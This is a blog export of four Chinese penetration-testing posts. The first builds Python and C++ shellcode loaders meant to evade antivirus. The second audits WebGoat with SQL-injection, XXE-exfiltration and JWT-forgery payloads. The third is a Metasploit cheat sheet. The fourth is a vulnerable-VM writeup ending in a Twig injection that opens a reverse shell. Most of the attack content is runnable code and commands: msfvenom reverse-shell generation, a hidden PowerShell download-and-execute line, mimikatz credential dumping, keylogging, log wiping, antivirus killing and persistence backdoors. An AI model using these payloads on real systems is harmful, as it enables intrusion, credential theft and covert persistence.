<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ShellCode加载器的探索与学习]]></title>
    <url>%2F2019%2F12%2F20%2FShellCode-Loader%2F</url>
    <content type="text"><![CDATA[ShellCode Loader 当目标机上存在杀软时，MSF/CS默认生成的Payload极大概率会被Kill掉，这样就很难受了。这个时候我们就需要一个能免杀加载Payload的程序了，攻防向来都是动态的，只有把握原理自行衍生摸索才是正道。 Python？一定要用pyhton吗，为啥要用python呢？实际上ctypes函数的原型都是c++函数，之所以使用python来打包，考虑到偏门语言编译自带的一些免杀光环. 加载器这个东西很多语言都可以实现，比如: [go-shellcode] https://github.com/brimstone/go-shellcode [c#] https://github.com/cribdragg3r/Simple-Loader c++ 以上举例有部分并不完善，但作概念验证足以。再来康康最近网上公开的几个代码 # 仅python2import ctypespayload = ""shellcode = bytearray(payload)ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1)) import ctypesshellcode = ""rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)ctypes.windll.kernel32.WaitForSingleObject(handle, -1) import ctypesbuf = ""#libc = CDLL('libc.so.6')PROT_READ = 1PROT_WRITE = 2PROT_EXEC = 4def executable_code(buffer): buf = c_char_p(buffer) size = len(buffer) addr = libc.valloc(size) addr = c_void_p(addr) if 0 == addr: raise Exception("Failed to allocate memory") memmove(addr, buf, size) if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC): raise Exception("Failed to set protection on buffer") return addrVirtualAlloc = ctypes.windll.kernel32.VirtualAllocVirtualProtect = ctypes.windll.kernel32.VirtualProtectshellcode = bytearray(buf)whnd = ctypes.windll.kernel32.GetConsoleWindow() if whnd != 0: if 1: ctypes.windll.user32.ShowWindow(whnd, 0) ctypes.windll.kernel32.CloseHandle(whnd)memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)old = ctypes.c_long(1)VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell), buf, ctypes.c_int(len(shellcode)))shell = cast(memorywithshell, CFUNCTYPE(c_void_p))shell() 原理都是通过ctypes库在内存注入shellcode，只要通过pyinstall打包为exe （对py版本有要求，否则报错，如我的3.7.3报错了） ctypes[python官方文档] https://docs.python.org/3/library/ctypes.html 在官方文档中我们可以看到，对应的数据类型 提取一下核心函数 VirtualAlloc(0, len(shellcode), 0x1000, 0x40)VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))CreateThread(0, 0, rwxpage, 0, 0, 0)WaitForSingleObject(handle, -1) VirtualAlloc引用一下rcoil大佬的原话 Cobalt Strike 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 VirtualAllocEx -&gt; WriteProcessMemory 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。 而这里的VirtualAlloc也是类似的，不过VirtualAllocEx 是在另一个进程分配内存VirtualAlloc则在本进程，其函数原型为 lpAddress 要分配的区域的起始地址 dwSize 要分配的大小, 以字节为单位 flAllocationType 内存分配的类型,具体类型种类可以自行查看 https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN flProtect 对要分配的页面区域的内存保护 RtlMoveMemory 将源内存块的内容复制到目标内存块 VOID RtlMoveMemory( _Out_ VOID UNALIGNED *Destination, _In_ const VOID UNALIGNED *Source, _In_ SIZE_T Length); Destination 指向要复制字节的目标存储块的指针。 Source 指向要复制字节的目标存储块的指针。 Length从源复制到目标的字节数。 VirualProtectBOOL VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); flNewProtect 内存保护选项 lpflOldProtect 指向变量的指针，该变量接收页面的指定区域中第一页的先前访问保护值。 #示例VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old)) CreateThread 创建一个线程以在调用进程的虚拟地址空间内执行 HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); lpThreadAttributes 描述是否可以由子进程继承 dwStackSize 堆栈的初始大小，以字节为单位 , 参数为0，则使用可执行文件的默认大小 (1MB) lpStartAddress 该指针表示线程的起始地址 lpParameter 指向要传递给线程的变量的指针 dwCreationFlags 控制线程创建的标志，0为创建后立即执行 lpThreadId 指向接收线程标识符的变量的指针，为 NULL，则不返回线程标识符 WaitForSingleObjectDWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); hHandle 对象的句柄 dwMilliseconds 超时时间间隔（以毫秒为单位） 如果指定了非零值，则函数将等待直到发出信号通知对象或间隔过去 C++原型很显然这些加载器的过程都是大同小异，核心就是以下流程 通过VirtualAlloc \ VirtualAllocEx分配内存 通过RtlMoveMemory \ RtlCopyMemory将Shellcode复制或移动到已分配内存中（C++中可简写为memcpy\memove） 使用CreateThread在子线程中运行 当然如果使用VirtualAllocEx就不需要使用CreateThread了 这里贴一下这些变形函数的c++原型 #include "stdio.h"#include "windows.h"#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行不显示窗口//这里放shellcodeunsigned char buf[] = "";void run(void* buffer) &#123; void(*function)(); function = (void (*)())buffer; function();&#125;void main()&#123; LPVOID ptr = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); RtlMoveMemory(ptr, buf, sizeof(buf)); LPVOID ht = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&amp;run, ptr, 0, NULL); WaitForSingleObject(ht, -1);&#125; PS:这个原型模板编译出来的exe已经被主流杀软杀掉了，这里鄙视下360。原因你懂的 小结说点题外话，cobaltstrike4.0中，根据其展示的视频，作者将VirtualAlloc替换为了HeadCreate ByPass了Win10的Defender。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>杀软对抗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从WebGoat学习Java代码审计]]></title>
    <url>%2F2019%2F04%2F20%2FCodeAudit-Java-Webgoat%2F</url>
    <content type="text"><![CDATA[说在前面的话 补一下以前挖的坑，好多忘了上传… 以前硬着头皮啃了本php代码审计的书，感觉还是java好玩，这次来学学Java审计。 ps:目的是熟悉各种漏洞在Java下的表现，所以并没有按着通关要求来做，只是点到为止 WebGoat环境配置 WebGoat是由OWASP维护的基于Java开发的Web应用程序，主要用于安全教学 [官方网站] [项目github] 既然是奔着代码审计来的，那当然是下载源代码啦。 先导入到idea，(关于maven配置等就不赘述了)，导入成功后maven会自动进行配置项目采用了SpringBoot，直接进入Debug模式 访问localhost:8080/WebGoat 注册个用户就可以登录了配置好后默认是只能从127.0.0.1访问，如果有需要可以打开这个文件，进行修改 webgoat-container/src/main/resources/application.properties 从SQLI开始审计之旅注入中第一项是SQL Injection (advanced),先测试注册功能那么先下个断点跟进到对应业务逻辑类，可以看到这里有一处参数检查 继续跟进，发现只检查了是否为空和长度，然后对用户名进行查重时直接带入了参数而查重后的插入数据使用了预编译鉴于返回到前端的参数只有user.created和user.exists两种。基本确认为盲注 漏洞验证如下，tom用户明明是存在的，但用户依然创建成功证明payload生效，and 1=2导致查询出的用户名不存在从而进入创建流程 那么exp应该是 tom'+and+if(ascii(substr(database(),1,1))&gt;100,SLEEP(10),NULL)--+ 然而报500错误，sql语法不正确，这是因为采用的是HSQLDB，即java内置的数据库IF和SLEEP语句是Mysql的扩展语句，emmm IF应该可以使用CASE WHEN THEN ELSE END代替，SLEEP没有找到代替的函数这个是SQLmap给出的时间盲注payload，我没看懂…似乎是重复查询多次达到延时的样子 username_reg=tom' AND CHAR(87)||CHAR(90)||CHAR(97)||CHAR(110)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND 'zDag'='zDag&amp;email_reg=a@gmail.com&amp;password_reg=123&amp;confirm_password_reg=123 后来发现可以直接布尔盲注，tom这个用户名是存在的为true，只要后面为false就会返回user created tom'+and+ascii(substr(database(),1,1))&lt;100--+ SQLi-5a 别问我为什么叫这个奇怪的名字，这是类名…. 根据form中的url搜索到对应类 union，堆注入,and/or都可以另一个是数字型注入SQLi-5bConnection connection = DatabaseUtilities.getConnection(getWebSession());String query = "SELECT * FROM user_data WHERE userid = " + accountName;try &#123; ... ResultSet results = statement.executeQuery(query); ...&#125; 同上的利用方法 SQLi-6a跟5a的利用相同 String query = "SELECT * FROM user_data WHERE last_name = '" + accountName + "'"; XXE-SimpleXXEtry &#123; Comment comment = comments.parseXml(commentStr); comments.addComment(comment, false); if (checkSolution(comment)) &#123; return trackProgress(success().build()); &#125;&#125; catch (Exception e) &#123; error = ExceptionUtils.getFullStackTrace(e);&#125; 先看一下commnet类 public class Comment &#123; private String user; private String dateTime; private String text;&#125; 继续跟进parseXml 可以看到SUPPORT_DTD设为了true,即启用了实体引用 同时IS_SUPPORTING_EXTERNAL_ENTITIES设为了true，启用了外部实体引用 在d盘根目录下新建一个文件hack.md ps:file:///不加任何文件名可以列目录 抓包将xml做一些修改，通过外部实体读取文件，并替换到输出点text中，刷新页面 XXE-Json可见post的表单同时支持json，xml，且默认使用json传输 尝试对HTTP头中的content-type进行修改，指定为xml Content-Type: application/xml 使之进入parseXml流程，成功触发XXE漏洞 Blind-XXEstatic final String CONTENTS = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";......@RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)@ResponseBodypublic AttackResult addComment(@RequestBody String commentStr) throws Exception &#123; //Solution is posted as a separate comment if (commentStr.contains(CONTENTS)) &#123; return trackProgress(success().build()); &#125; try &#123; Comment comment = comments.parseXml(commentStr); comments.addComment(comment, false); &#125; catch (Exception e) &#123; return trackProgress(failed().output(e.toString()).build()); &#125; return trackProgress(failed().build());&#125; 当获取值包含要读取的字符串时，执行return 预期解法应该是使用带外通道来回显 但我通过原方法进行读取，并没有拦截到 仔细一想…payload确实不包含WebGoat 8.0 rocks... (...这个字符串啊,而且为啥会包含啊 陷入沉思… &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY % file SYSTEM &quot;file:///c:/windows-version.txt&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://localhost:9090/ping?text=%file;&apos;&gt;&quot;&gt; %all; 以上是预期解 Authentication Bypasses public boolean didUserLikelylCheat(HashMap&lt;String,String&gt; submittedAnswers) &#123; boolean likely = false; if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &#123; likely = true;&#125;if ((submittedAnswers.containsKey("secQuestion0") &amp;&amp; submittedAnswers.get("secQuestion0").equals(secQuestionStore.get(verifyUserId) .get("secQuestion0"))) &amp;&amp; (submittedAnswers.containsKey("secQuestion1") &amp;&amp; submittedAnswers.get("secQuestion1").equals(secQuestionStore.get(verifyUserId) .get("secQuestion1"))) ) &#123; likely = true; &#125; else &#123; likely = false; &#125; return likely; &#125; public boolean verifyAccount(Integer userId, HashMap&lt;String,String&gt; submittedQuestions ) &#123; //short circuit if no questions are submitted if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &#123; return false; &#125; if (submittedQuestions.containsKey("secQuestion0") &amp;&amp; !submittedQuestions.get("secQuestion0").equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) &#123; return false; &#125; if (submittedQuestions.containsKey("secQuestion1") &amp;&amp; !submittedQuestions.get("secQuestion1").equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) &#123; return false; &#125; // else return true;&#125; 简单来说就是提交两个参数secQuestion0,secQuestion1判断是否与设定的相等相等判断为作弊…返回失败不相等则进行下次比较，但这次又要求相等才返回成功…非常有CTF味道的一道题emmm Map &lt;String,String&gt; userAnswers = new HashMap&lt;&gt;();List&lt;String&gt; paramNames = Collections.list(req.getParameterNames());for (String paramName : paramNames) &#123; //String paramName = req.getParameterNames().nextElement(); if (paramName.contains("secQuestion")) &#123; userAnswers.put(paramName,req.getParameter(paramName)); &#125;&#125;return (HashMap)userAnswers; 仔细一看，参数的传递并不是通过@RequestParam指定的 而且判断参数时只判断了是否包含SecQuestion字段可以篡改参数secQuestion0为secQuestion2以及secQuestion1为secQuestion3，达到绕过目的 这里展现了一处由逻辑漏洞引发的身份验证失效与越权问题，比较有意思 JWT tokens-4JSON WEB Token（JWT），是一种基于JSON的、用于令牌标识（token） 近年来RESTful API开始风靡，使用HTTP header来传递认证令牌似乎变得理所应当，但是很多开发者误用了jwt，这个东西也有它的缺点，比如 一旦颁发票据，就无法作废。 所有的认证信息都在JWT中，由于在服务端没有状态，即使你知道了某个JWT被盗取了，你也没有办法将其作废。在JWT过期之前（你绝对应该设置过期时间），你无能为力。 存储问题 JWT的存储选项有local storage、session storage和cookie 放到cookie意味着不能httponly，产生了XSS风险 放到storage，安全问题更加严重。 可见JWT其实比较适合一次性的命令认证，而不太适用于session JWT构成JWT通常由三部分组成: 头信息（header）, 消息体（payload）和签名（signature），签名部分用于确保前两个数据块不被篡改。 access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NTgwMTUxNDksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg; 对抓到的请求包的cookie进行base64解码 &#123; "alg":"HS512"&#125;.&#123; "iat":1558015149, "admin":"false", "user":"Sylvester"&#125;.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg JWT的攻击面 未校验签名 禁用哈希 密钥暴破 尝试篡改admin值，若服务端没有作签名校验，将导致直接越权。 &#123;"alg":"HS512"&#125;.&#123;"iat":1558015149,"admin":"true","user":"Sylvester"&#125; In0.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg 或者使用pyjwt生成空签名的jwt token pip install pyjwtimport jwtjwt.encode(&#123;'iat': 1558015149, "admin":"true","user":"Sylvester"&#125;, algorithm='none', key='')eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJmYW5ydWFuIiwiaWF0IjoxNTc1NDI1MjkyLCJleHAiOjE1NzU0Mjg4OTIsInN1YiI6ImFkbWluIiwiZGVzY3JpcHRpb24iOiJhZG1pbihhZG1pbikiLCJqdGkiOiJqd3QifQ. 到这里腰斩了，不限期咕咕咕。毕竟离校之后很难再有那样大块的时间了…看到这里是不是很蛋疼。本来没打算发的，想想还是发吧hhh]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-ALL-In-One]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-All-In-One%2F</url>
    <content type="text"><![CDATA[Meterpreter 基本命令execute #在目标机中执行文件execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互clearev #清除windows中的应用程序日志、系统日志、安全日志edit c:\\1.txt #编辑或创建文件 没有的话，会新建文件lcd /tmp #操作攻击者主机 切换目录timestomp C:// -h #查看帮助timestomp -v C://2.txt #查看时间戳timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txtportfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口删除 进程迁移 # 自动迁移,一般是迁移到记事本run post/windows/manage/migrate # 手动迁移getpid # 获取当前进程的pidps # 查看当前活跃进程migrate &lt;pid值 #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值 #杀死进程 信息搜集sysinfoarpgetproxy #查看代理信息idletime # 查看运行时间route # 查看子网getuid # 查看用户名与权限run post/windows/gather/checkvm #是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives #查看分区run post/windows/gather/enum_applications #获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie #获取IE缓存run post/windows/gather/enum_chrome #获取Chrome缓存run post/windows/gather/enum_patches #补丁信息run post/windows/gather/enum_domain #查找域控run post/windows/gather/enum_logged_on_users # 已登录用户列举run post/windows/manage/killav # 杀死杀软run post/windows/manage/enable_rdp # 启动远程桌面 提权模块getsystem # 枚举补丁backgrounduse post/windows/gather/enum_patchesset sessions 1runuse post/mutli/recon/local_exploit_suggester #枚举提权exp BypassUACbackrounduse exploit/windows/local/bypassuacset session 1run exploit/windows/local/bypassuacexploit/windows/local/bypassuac_comhijackexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_injection_winsxsexploit/windows/local/bypassuac_sluihijackexploit/windows/local/bypassuac_vbs 令牌操纵令牌伪造use incognitolist_tokens -u #列出tokenimpersonate_token WIN-57TJ4B561MT\\Administratorshellwhoamirev2self #返回原始token 窃取令牌steal_token &lt;pid值 #从指定进程中窃取token 先psdrop_token #删除窃取的token 内核提权run post/windows/gather/enum_patches #查看补丁信息use exploit/windows/local/ms10_092_schelevatorset session 1exploit 密码抓取load mimikatzwdigest #获取Wdigest密码mimikatz_command -f samdump::hashes #执行mimikatz原始命令 抓取hashmimikatz_command -f samdump:: #查看介绍mimikatz_command -f sekurlsa::searchPasswordsmimikatz_command -f a:: #通过加载错误模块查看帮助mimikatz_command -f hash:: #选用该模块msv #抓取系统hashtspkgkerberos #抓取系统票据ssp #ipc$密码wdigest #获取系统账号信息 use post/windows/gather/hashdump set session 1run#orhashdump #可以导出域内所有用户hash#需要SYSTEM权限#如果开启了UAC会失败，需要先绕过UACrun post/windows/gather/smart_hashdump 屏幕抓取load espiascreengrab screenshot 摄像头抓取webcam_snap # 直播webcam_stream 键盘操纵键盘开关uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘/鼠标uictl disable mouse #禁用鼠标uictl disable keyboard #禁用键盘 键盘记录keyscan_start #开始键盘记录keyscan_dump #导出记录数据keyscan_stop #结束键盘记录 添加用户run post/windows/manage/enable_rdp USERNAME=*** PASSWORD=***run getgui -u example_username -p example_password #不推荐run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #将3389端口转发到6662 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe通过net user添加；端口转发是利用的portfwd命令 文件操作download c:\test.txt /root upload /root/test.txt c:\ 文件搜索search -f *flag*search -f *.txt 注册表操作reg –h -d 注册表中值的数据. -k 注册表键路径 -v 注册表键名称 enumkey 枚举可获得的键 setval 设置键值 queryval 查询键值数据 Metasploit基本命令setgunsetg #可以配置全局变量#删除目标机上的应用程序、系统和安全日志clearev 自动路由run get_local_subnets # 查看网段run autoroute -s ip/24 # 路由子网run post/windows/manage/autoroute # 查看并路由子网backgroundroute add 目标ip 掩码 session_idroute print 配置代理use auxiliary/server/socks4a set srvhost 127.0.0.1set srvport 1080run msf端口扫描use auxiliary/scanner/portscan/tcpset rhostsset ports 21-25,80-90,8080-8090,1433,3306,1521,445,139,135run msf_arp扫描run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389 nmap存活扫描db_nmap --min-hostgroup 1024 --min-parallelism 1024 -p 445 10.0.0.0-10.255.255.255 #-sn 应用扫描#/usr/share/metasploit-framework/modules/auxiliary/scanner/use auxiliary/scanner/http/dir_scanneruse auxiliary/scanner/http/jboss_vulnscanuse auxiliary/scanner/oracle/oracle_loginauxiliary/scanner/telnet/telnet_login #TELNET登录scanner/vnc/vnc_none_auth #VNC空口令扫描auxiliary/scanner/ssh/ssh_loginSSH #登录测试auxiliary/scanner/portscan #端口扫描---smbauxiliary/scanner/smb/smb_version #SMB系统版本扫描auxiliary/scanner/smb/smb_enumusers #SMB枚举auxiliary/scanner/smb/smb_login #SMB弱口令auxiliary/scanner/smb/psexec_command #SMB登录且执行命令---mssqlauxiliary/scanner/mssql/mssql_loginscanner/mssql/mssql_ping #主机信息扫描admin/mssql/mssql_enum #枚举admin/mssql/mssql_exec #执行命令admin/mssql/mssql_sql #查询scanner/mssql/mssql_login #弱口令扫描---mysqlauxiliary/scanner/mysql/mysql_versionauxiliary/admin/mysql/mysql_enum #枚举auxiliary/admin/mysql/mysql_sql #语句执行auxiliary/scanner/mysql/mysql_login #弱口令扫描---smtpauxiliary/scanner/smtp/smtp_version #SMTP版本扫描auxiliary/scanner/smtp/smtp_enum #SMTP枚举auxiliary/scanner/snmp/community #SNMP扫描设备 扫描利用批量导入目标ipdb_import "/root/445-ip.txt" 扫描445use auxiliary/scanner/smb/smb_versionset rhosts 10.0.0.0-10.0.255.255set threads 400run 扫描MS17-010use auxiliary/scanner/smb/smb_ms17_010set threads 50#set rhosts 10.0.0.1-10.0.255.255#set rhosts 192.168.1.1/24hosts -Rrun 利用MS17-010use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_tcphosts -R use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 本机ipset lport 4444 端口转发meterpreter portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L opt 要监听的本地主机（可选）。 -h 帮助横幅。 -l opt 要监听的本地端口。 -p opt 要连接的远程端口 -r opt 要连接的远程主机portfwd add -l 5555 -p 3389 -r 192.168.1.30 抓包嗅探use sniffersniffer_interfaces #查看网卡sniffer_start 2 #选择网卡 开始抓包sniffer_stats 2 #查看状态sniffer_dump 2 /tmp/lltest.pcap #导出pcap数据包sniffer_stop 2 #停止抓包 RC脚本# 将较常用的命令保存为xx.rc# msfconsole -r xx.rc# msf resource xx.rcuse exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lhost 192.168.22.170set lport 6661exploit -j MsfvenomLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f bash -o textmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f sh -o text Powershellmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-reflection -o /mnt/c/Users/sherd/Desktop/a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh -o /mnt/c/Users/sherd/Desktop/a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-net -o /mnt/c/Users/sherd/Desktop/a.ps1#执行powershell -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.135.100/a.ps1');a.ps1"PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1#黏贴执行msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-cmd -o /mnt/c/Users/sherd/Desktop/a.txt 与powersploit联动 #生成shellcode #ps1生成的shellcode一致msfvenom -p windows/meterpreter/reverse_https lhost=192.168.102.1 lport=4444 -f powershell -o /var/www/html/PowerSploit/testIEX (New-Object Net.WebClient).DownloadString("http://192.168.102.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")IEX (New-Object Net.WebClient).DownloadString("http://192.168.102.1/PowerSploit/test")#执行Invoke-Shellcode -Shellcode ($buf) -Force Win#exe-only exe-service exe-smallmsfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe -o a.exe Javamsfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jar -o text.jar Phpmsfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; text.php Jspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt;text.jsp#免杀msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jsp -o /mnt/c/Users/sherd/Desktop/jsp.jspmsfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war -o text.war Aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp -o shell.asp Aspxmsfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f aspx -o /home/niexinming/back.aspx Androidmsfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 R &gt; text.apk Metasploit BacokDoorMetsvc服务run metsvc -A #自动安装后门run metsvc # 自定义后门set payload windows/metsvc_bind_tcpset rhost 目标ipset lport 目标监听端口run Cymothoa上传到目标机 cymotha -p 982 -s 1 -y 4444nc -nvv 目标ip 4444 Persistencerun persistence -A -S -U -i 60 -p 4321 -r iprun persistence -A -U -X -i 60 -p 6666 -r ip -A 自启动payload -S 系统自启动加载（服务） -U 用户登录自启动 -X 开机自加载 -i 回连时间间隔 -P 监听反向连接端口号 -r 目标机器IP]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:Typhoon靶机入侵]]></title>
    <url>%2F2019%2F04%2F19%2FTyphoon%2F</url>
    <content type="text"><![CDATA[简介 目标：root 作者：PrismaCSI 难度定位：无 渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅 MongoDB未授权访问 21/tcp open ftp vsftpd 3.0.222/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)25/tcp open smtp Postfix smtpd53/tcp open domain ISC BIND 9.9.5-3 (Ubuntu Linux)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))110/tcp open pop3 DovMarkdown Theme Kitecot pop3d111/tcp open rpcbind 2-4 (RPC #100000)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd (Ubuntu)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)631/tcp open ipp CUPS 1.7993/tcp open ssl/imaps?995/tcp open ssl/pop3s?2049/tcp open nfs_acl 2-3 (RPC #100227)3306/tcp open mysql MySQL (unauthorized)5432/tcp open postgresql PostgreSQL DB 9.3.3 - 9.3.56379/tcp open redis Redis key-value store 4.0.118080/tcp open http Apache Tomcat/Coyote JSP engine 1.127017/tcp open mongodb MongoDB 3.0.1533867/tcp open nlockmgr 1-4 (RPC #100021)35717/tcp open mountd 1-3 (RPC #100005)38819/tcp open mountd 1-3 (RPC #100005)49775/tcp open mountd 1-3 (RPC #100005)58730/tcp open status 1 (RPC #100024) 可以看到有较多服务那么跑目录走起，发现有mongoadmin username : typhoonpassword : 789456123 总共有两个集合，creds和typhoon，账号密码是creds下的，提示很明显了反手一个SSH 就这么没了????事实上…实际的利用链当然不是这样子 redis-cli -h 192.168.201.6 先尝试下一般的利用，在低权限时写🐎 但是访问页面是500，尝试写入php的反弹shell，还是500 开下外挂看看怎么回事，wtf？这个权限660，其他用户读不了，尴尬😅尝试crontab计划任务弹shell和写ssh公钥均因为权限问题失败 突发奇想，权限不够?，那我写root的，或许运行root登录呢尝试写入篡改root用户的公钥…然而还是需要密码Orz 服务端SSTI这个靶机是有多个GetShell方法的，我尽量尝试把它们都找出来 没想到还给配了个DVWA练习平台，那么默认账号密码admin,password，对于DVWA，相信大家都很熟悉了但这样就没意思了，而另一个XVWA我还是第一次玩，我决定让它变得更有意思一些，JustForFun 比如说模板注入 对于TWIG的模板注入，使用以下payload可以达到命令执行 &#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125; Hello www-data 那么可以直接拿到shell了 &#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.135/6666 0&gt;&amp;1")&#125;&#125; 但是尝试了几种方法都会报字符错误换一种思路 